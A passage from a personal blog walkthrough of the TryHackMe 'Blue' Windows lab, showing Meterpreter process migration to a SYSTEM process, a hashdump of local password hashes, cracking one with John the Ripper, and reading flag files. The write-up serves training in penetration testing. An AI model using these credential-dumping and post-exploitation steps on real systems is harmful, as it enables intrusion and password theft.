</span></span><span class=line><span class=cl> <span class=m>2132</span>  <span class=m>844</span>   WmiPrvSE.exe
</span></span><span class=line><span class=cl> <span class=m>2228</span>  <span class=m>1324</span>  cmd.exe              x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>md.exe
</span></span><span class=line><span class=cl> <span class=m>2600</span>  <span class=m>716</span>   SearchIndexer.exe    x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM
</span></span><span class=line><span class=cl> <span class=m>2612</span>  <span class=m>716</span>   vds.exe              x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM
</span></span><span class=line><span class=cl> <span class=m>2736</span>  <span class=m>568</span>   conhost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\c</span>onhost.exe
</span></span><span class=line><span class=cl> <span class=m>2856</span>  <span class=m>716</span>   mscorsvw.exe         x86   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\M</span>icrosoft.NET<span class=se>\F</span>ramework<span class=se>\v</span>4.0
</span></span><span class=line><span class=cl>                                                                               .30319<span class=se>\m</span>scorsvw.exe
</span></span><span class=line><span class=cl> <span class=m>2888</span>  <span class=m>716</span>   mscorsvw.exe         x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM           C:<span class=se>\W</span>indows<span class=se>\M</span>icrosoft.NET<span class=se>\F</span>ramework64<span class=se>\v</span><span class=m>4</span>
</span></span><span class=line><span class=cl>                                                                               .0.30319<span class=se>\m</span>scorsvw.exe
</span></span><span class=line><span class=cl> <span class=m>2928</span>  <span class=m>716</span>   svchost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\L</span>OCAL SERVICE
</span></span><span class=line><span class=cl> <span class=m>2972</span>  <span class=m>716</span>   sppsvc.exe           x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\N</span>ETWORK SERVICE
</span></span><span class=line><span class=cl> <span class=m>2996</span>  <span class=m>716</span>   svchost.exe          x64   <span class=m>0</span>        NT AUTHORITY<span class=se>\S</span>YSTEM
</span></span></code></pre></td></tr></table></div></div><p>We could use this one here <code>2888 716 mscorsvw.exe x64 0 NT AUTHORITY\SYSTEM</code></p><p>This process if for the ms windows core services and it is running as SYSTEM</p><p>The process id is <code>2888</code></p><ul><li>Migrate to this process using the &lsquo;migrate PROCESS_ID&rsquo; command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; migrate <span class=m>2888</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Migrating from <span class=m>1464</span> to 2888...
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Migration completed successfully.
</span></span></code></pre></td></tr></table></div></div><p>Looks like the migration worked fine.</p><hr><h2 id=task-4-cracking>Task 4: Cracking</h2><h3 id=dump-the-non-default-users-password-and-crack-it>Dump the non-default user&rsquo;s password and crack it!</h3><hr><ul><li>Within our elevated meterpreter shell, run the command &lsquo;hashdump&rsquo;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; hashdump
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class=line><span class=cl>Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
</span></span></code></pre></td></tr></table></div></div><p>The name of the non-default user is <code>Jon</code> here.</p><ul><li>Copy this password hash to a file and research how to crack it. What is the cracked password?</li></ul><p>Ok so let&rsquo;s copy the hash to a file <code>hash.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::&#34;</span> &gt; hash.txt
</span></span></code></pre></td></tr></table></div></div><p>the hash format should be NT</p><p>Let&rsquo;s try to crack it using john the ripper and use the wordlist rockyou.txt since it contains
a lot of commonly used passwords!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo john --format<span class=o>=</span>nt hash.txt --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt                                      <span class=m>1</span> ⨯
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>NT <span class=o>[</span>MD4 256/256 AVX2 8x3<span class=o>])</span>
</span></span><span class=line><span class=cl>Warning: no OpenMP support <span class=k>for</span> this <span class=nb>hash</span> type, consider --fork<span class=o>=</span><span class=m>8</span>
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>alqfna22         <span class=o>(</span>Jon<span class=o>)</span>     
</span></span><span class=line><span class=cl>1g 0:00:00:00 DONE <span class=o>(</span>2022-04-09 03:26<span class=o>)</span> 1.923g/s 19616Kp/s 19616Kc/s 19616KC/s alr19882006..alpusidi
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show --format=NT&#34;</span> options to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed.
</span></span></code></pre></td></tr></table></div></div><p>We successfully cracked the password hash!</p><p>The passwords for the user <code>Jon</code> is <code>alqfna22</code> !</p><hr><h2 id=task-5-find-flags>Task 5: Find flags!</h2><h3 id=find-the-three-flags-planted-on-this-machine-these-are-not-traditional-flags-rather-theyre-meant-to-represent-key-locations-within-the-windows-system-use-the-hints-provided-below-to-complete-this-room>Find the three flags planted on this machine. These are not traditional flags, rather, they&rsquo;re meant to represent key locations within the Windows system. Use the hints provided below to complete this room!</h3><hr><ul><li>Flag1? This flag can be found at the system root.</li></ul><p>Let&rsquo;s switch back to our terminal session 1</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 post<span class=o>(</span>multi/manage/shell_to_meterpreter<span class=o>)</span> &gt; sessions -i <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting interaction with 1...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Shell Banner:
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 6.1.7601<span class=o>]</span>
</span></span><span class=line><span class=cl>-----
</span></span><span class=line><span class=cl>          
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;
</span></span></code></pre></td></tr></table></div></div><p>and locate the flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;cd ..
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows&gt;cd ..
</span></span><span class=line><span class=cl><span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\&gt;</span>dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is E611-0B66
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>
</span></span><span class=line><span class=cl>03/17/2019  02:27 PM                <span class=m>24</span> flag1.txt
</span></span><span class=line><span class=cl>07/13/2009  10:20 PM    &lt;DIR&gt;          PerfLogs
</span></span><span class=line><span class=cl>04/12/2011  03:28 AM    &lt;DIR&gt;          Program Files
</span></span><span class=line><span class=cl>03/17/2019  05:28 PM    &lt;DIR&gt;          Program Files <span class=o>(</span>x86<span class=o>)</span>
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          Users
</span></span><span class=line><span class=cl>03/17/2019  05:36 PM    &lt;DIR&gt;          Windows
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>24</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>5</span> Dir<span class=o>(</span>s<span class=o>)</span>  20,617,707,520 bytes free
</span></span></code></pre></td></tr></table></div></div><p>the flag is called flag1.txt</p><p>let&rsquo;s get the contents of it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\&gt;</span><span class=nb>type</span> flag1.txt
</span></span><span class=line><span class=cl><span class=nb>type</span> flag1.txt
</span></span><span class=line><span class=cl>flag<span class=o>{</span>access_the_machine<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>We managed to get the first flag!</p><ul><li>Flag2? This flag can be found at the location where passwords are stored within Windows.</li></ul><p>*Errata: Windows really doesn&rsquo;t like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.</p><p>Passwords in windows are usually stored in the SAM database.</p><p>This database is located in <code>C:\Windows\System32\config</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>onfig
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>onfig&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is E611-0B66
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>onfig
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>04/08/2022  08:11 PM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>04/08/2022  08:11 PM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>12/12/2018  06:00 PM            28,672 BCD-Template
</span></span><span class=line><span class=cl>04/08/2022  08:19 PM        18,087,936 COMPONENTS
</span></span><span class=line><span class=cl>04/08/2022  08:20 PM           262,144 DEFAULT
</span></span><span class=line><span class=cl>03/17/2019  02:32 PM                <span class=m>34</span> flag2.txt
</span></span><span class=line><span class=cl>07/13/2009  09:34 PM    &lt;DIR&gt;          Journal
</span></span><span class=line><span class=cl>03/17/2019  02:56 PM    &lt;DIR&gt;          RegBack
</span></span><span class=line><span class=cl>03/17/2019  03:05 PM           262,144 SAM
</span></span><span class=line><span class=cl>04/08/2022  08:20 PM           262,144 SECURITY
</span></span><span class=line><span class=cl>04/08/2022  08:37 PM        40,632,320 SOFTWARE
</span></span><span class=line><span class=cl>04/08/2022  08:33 PM        12,582,912 SYSTEM
</span></span><span class=line><span class=cl>11/20/2010  09:41 PM    &lt;DIR&gt;          systemprofile
</span></span><span class=line><span class=cl>12/12/2018  06:03 PM    &lt;DIR&gt;          TxR
</span></span><span class=line><span class=cl>               <span class=m>8</span> File<span class=o>(</span>s<span class=o>)</span>     72,118,306 bytes
</span></span><span class=line><span class=cl>               <span class=m>6</span> Dir<span class=o>(</span>s<span class=o>)</span>  20,617,707,520 bytes free
</span></span></code></pre></td></tr></table></div></div><p>There is the file we are looking for.</p><p>It is <code>SAM</code>.</p><p>And here is our second flag!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>onfig&gt;type flag2.txt
</span></span><span class=line><span class=cl><span class=nb>type</span> flag2.txt
</span></span><span class=line><span class=cl>flag<span class=o>{</span>sam_database_elevated_access<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</li></ul><p>This is a hint to look at the home directory of the admin user.</p><p>Let&rsquo;s see what he has hidden there &mldr;</p><p>There is no user <code>Administrator</code> in the directory <code>C:\Users</code>.</p><p>But instead there is a user folder for the user <code>Jon</code>.</p><p>Let&rsquo;s see what he is hiding there &mldr;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers&gt;cd C:<span class=se>\U</span>sers<span class=se>\J</span>on
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\J</span>on&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is E611-0B66
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\J</span>on
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          Contacts
</span></span><span class=line><span class=cl>12/12/2018  10:49 PM    &lt;DIR&gt;          Desktop
</span></span><span class=line><span class=cl>12/12/2018  10:49 PM    &lt;DIR&gt;          Documents
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          Downloads
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          Favorites
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          Links
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          Music
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          Pictures
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          Saved Games
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          Searches
</span></span><span class=line><span class=cl>12/12/2018  10:13 PM    &lt;DIR&gt;          Videos
</span></span><span class=line><span class=cl>               <span class=m>0</span> File<span class=o>(</span>s<span class=o>)</span>              <span class=m>0</span> bytes
</span></span><span class=line><span class=cl>              <span class=m>13</span> Dir<span class=o>(</span>s<span class=o>)</span>  20,619,608,064 bytes free
</span></span></code></pre></td></tr></table></div></div><p>Mh nothing?</p><p>Let&rsquo;s take a look at his documents.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\J</span>on&gt;dir Documents
</span></span><span class=line><span class=cl>dir Documents
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is E611-0B66
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\J</span>on<span class=se>\D</span>ocuments
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>12/12/2018  10:49 PM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>12/12/2018  10:49 PM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>03/17/2019  02:26 PM                <span class=m>37</span> flag3.txt
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>37</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>  20,619,608,064 bytes free
</span></span></code></pre></td></tr></table></div></div><p>Gotcha! There is our third flag!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\J</span>on&gt;cd Documents
</span></span><span class=line><span class=cl><span class=nb>cd</span> Documents
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\J</span>on<span class=se>\D</span>ocuments&gt;type flag3.txt
</span></span><span class=line><span class=cl><span class=nb>type</span> flag3.txt
</span></span><span class=line><span class=cl>flag<span class=o>{</span>admin_documents_can_be_valuable<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>We managed to get the third and last flag
and thus successfully completed this room!</p><p><strong>Thanks for tuning in!</strong></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-tag><span><a href=/tags/tryhackme/>tryhackme</a>
</span><span><a href=/tags/thm/>thm</a>
</span><span><a href=/tags/privesc/>privesc</a>
</span><span><a href=/tags/windows/>windows</a>
</span><span><a href=/tags/eternal-blue/>eternal blue</a>
</span><span><a href=/tags/metasploit/>Metasploit</a></span></div><div class=post-info-line><div class=post-info-mod><span>Updated on 2022-04-09</span></div><div class=post-info-mod></div></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/ data-title="THM - Learn - Offensive Pentesting - Blue" data-hashtags="tryhackme,thm,privesc,windows,eternal blue,metasploit"><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/ data-hashtag=tryhackme><i class="fab fa-facebook-square fa-fw"></i></a><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/><i class="fab fa-linkedin fa-fw"></i></a><a href=javascript:void(0); title="Share on WhatsApp" data-sharer=whatsapp data-url=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/ data-title="THM - Learn - Offensive Pentesting - Blue" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/><i class="fab fa-reddit fa-fw"></i></a><a href=javascript:void(0); title="Share on Xing" data-sharer=xing data-url=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/ data-title="THM - Learn - Offensive Pentesting - Blue"><i class="fab fa-xing fa-fw"></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/ data-title="THM - Learn - Offensive Pentesting - Blue"><i class="fab fa-line fa-fw"></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/ data-title="THM - Learn - Offensive Pentesting - Blue" data-image=/featuredImages/blue-thumbnail.png><i class="fab fa-weibo fa-fw"></i></a><a href=javascript:void(0); title="Share on Myspace" data-sharer=myspace data-url=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/ data-title="THM - Learn - Offensive Pentesting - Blue" data-description><i data-svg-src=/lib/simple-icons/icons/myspace.min.svg></i></a><a href=javascript:void(0); title="Share on Blogger" data-sharer=blogger data-url=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/ data-title="THM - Learn - Offensive Pentesting - Blue" data-description><i class="fab fa-blogger fa-fw"></i></a><a href=javascript:void(0); title="Share on Evernote" data-sharer=evernote data-url=https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/ data-title="THM - Learn - Offensive Pentesting - Blue"><i class="fab fa-evernote fa-fw"></i></a></span></div></div><div class=post-nav><a href=/posts/ritsecctf-crypto-lost-in/ class=prev rel=prev title="RITSEC CTF - Crypto - Lost In"><i class="fas fa-angle-left fa-fw"></i>Previous Post</a>
<a href=/posts/htb-starting-point-responder/ class=next rel=next title="HTB - Starting Point - Responder">Next Post<i class="fas fa-angle-right fa-fw"></i></a></div></div></div><div id=comments class=single-card><div id=disqus_thread></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://disqus.com/?ref_noscript>Disqus</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/></a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div><script>"serviceWorker"in navigator&&(navigator.serviceWorker.register("/sw.min.js?version=1.0.1",{scope:"/"}).then(()=>{console.info("Pascal\u0027s Blog\u00A0Service Worker Registered")},e=>console.error("Pascal\u0027s Blog\u00A0Service Worker registration failed: ",e)),navigator.serviceWorker.ready.then(()=>{console.info("Pascal\u0027s Blog\u00A0Service Worker Ready")}))</script></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-chevron-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment-alt fa-fw"></i></a></div><link rel=stylesheet href=/syntax/main.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.d72727e8871a410e34fcc2815b65b84618acfc36c82d4ef80b5bd2acb2710aae7ba3de35626d354b036c38caaf10116572051aeb12e23d8fcd4b947e13aced25.css integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ=="><link rel=stylesheet href=/lib/animate/animate.min.e68ad90d2f9b7f6b4e373c97297ee55bedc3dcf08adafb4903cbee9093358fe113080efdae3162b0d69987b2aacdf8f5f53eed9faef52cf397b8bd499f9a07ba.css integrity="sha512-5orZDS+bf2tONzyXKX7lW+3D3PCK2vtJA8vukJM1j+ETCA79rjFisNaZh7Kqzfj19T7tn671LPOXuL1Jn5oHug=="><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.93025484925a4c3cc6a7a5533c16cc4160455287fafa9bf448cdecf1fa3e13a5e73e6566b5fc0434ad2f1d8ba9dedb189ea1e0443a010d3256a2aeeb9d0c36fa.css integrity="sha512-kwJUhJJaTDzGp6VTPBbMQWBFUof6+pv0SM3s8fo+E6XnPmVmtfwENK0vHYup3tsYnqHgRDoBDTJWoq7rnQw2+g=="><link rel=stylesheet href=/lib/katex/katex.min.06226afd2dd697e1801ed8227165c22b8b3e14b151b03c83901cfc8c57d20b9665678e453e5b2a73cc41e145252943b2557ee2ab6c44a0e24628d716f7cad074.css integrity="sha512-BiJq/S3Wl+GAHtgicWXCK4s+FLFRsDyDkBz8jFfSC5ZlZ45FPlsqc8xB4UUlKUOyVX7iq2xEoOJGKNcW98rQdA=="><link rel=stylesheet href=/lib/katex/copy-tex.min.ce9612e4a9d8cd65d40a9d9e295b4d0c804057184019b8573829e6e1e6540ec62a72f78cc289217d5e45a4d4f5af6de9af740b6f55ecc3ecc9edea806407416a.css integrity="sha512-zpYS5KnYzWXUCp2eKVtNDIBAVxhAGbhXOCnm4eZUDsYqcveMwokhfV5FpNT1r23pr3QLb1Xsw+zJ7eqAZAdBag=="><link rel=stylesheet href=/lib/cookieconsent/cookieconsent.min.2d0f7b71a99aaff94e9624ff32a8dc42ce645a0cba433fdc091cf34735027efd1fa2db024c2f591d768f426255f17bbf3d500b7c967b0437b3979956dffa81c6.css integrity="sha512-LQ97camar/lOliT/MqjcQs5kWgy6Qz/cCRzzRzUCfv0fotsCTC9ZHXaPQmJV8Xu/PVALfJZ7BDezl5lW3/qBxg=="><script src=https://pascals-blog.disqus.com/embed.js defer></script><script src=/lib/autocomplete/autocomplete.min.2f5284223a38dd47122850532ee135049a58557810c4183f0f5422029de5b2a9af43ea35178943df4d222cae8ed43a7a789204bfd0bf7aea14f296e557b4c04d.js integrity="sha512-L1KEIjo43UcSKFBTLuE1BJpYVXgQxBg/D1QiAp3lsqmvQ+o1F4lD300iLK6O1Dp6eJIEv9C/euoU8pblV7TATQ=="></script><script src=/lib/lunr/lunr.min.e31525fdde83e931eb0275c0c066a35e4a1669e30dc0428ae2235fab90e8b446cb3c07e4e854b148fdf274dc6a0e00b0d5cff4675260e8bf21da3fbefbd0599a.js integrity="sha512-4xUl/d6D6THrAnXAwGajXkoWaeMNwEKK4iNfq5DotEbLPAfk6FSxSP3ydNxqDgCw1c/0Z1Jg6L8h2j+++9BZmg=="></script><script 